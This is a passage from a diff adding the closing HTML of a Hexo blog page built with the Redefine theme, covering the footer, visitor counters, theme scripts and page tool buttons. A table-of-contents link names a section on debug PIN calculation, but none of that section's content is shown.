href="#debug-pin%E7%A0%81%E8%AE%A1%E7%AE%97"><span class="nav-text">debug pin码计算</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>Invalid date</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">阿巴</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.2.2</a>
+        </div>
+        
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
